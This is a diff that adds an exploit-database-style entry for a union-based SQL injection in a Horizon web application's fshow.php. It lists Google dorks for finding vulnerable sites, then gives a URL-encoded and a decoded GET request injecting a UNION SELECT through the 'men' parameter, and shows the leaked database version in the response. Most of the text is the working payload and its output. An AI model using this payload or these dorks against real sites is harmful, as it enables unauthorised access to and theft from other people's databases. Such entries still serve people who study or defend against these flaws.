@@ -1,0 +1,21 @@
+# Exploit Title: Horizon SQLi
+# Google Dork: intext:"Site by Horizon"
+#            : inurl:"uid=HORIZON3"
+# Date: 03/05/2011
+# Author: Iolo Morganwg
+# Category: Web App
+# Version: PHP
+# Tested on: Windows XP
+# Vendor: http://www.horizonsolutions.tv/
+# Notes: Both params are vulnerable to union based sqli
+
+# Encoded (URL) Example
+/fshow.php?uid=HORIZON3&men=-4649%27%20UNION%20ALL%20SELECT%20CONCAT%28CHAR%2858%2C119%2C117%2C97%2C58%29%2CIFNULL%28CAST%28version%28%29%20AS%20CHAR%29%2CCHAR%2832%29%29%2CCHAR%2858%2C99%2C105%2C99%2C58%29%29%23%20
+
+# Un-Encoded Example
+GET /fshow.php?uid=HORIZON3&men=-4649' UNION ALL SELECT
+CONCAT(CHAR(58,119,117,97,58),IFNULL(CAST(version() AS
+CHAR),CHAR(32)),CHAR(58,99,105,99,58))#  HTTP/1.1
+
+# Query Answer
+5.1.55-log
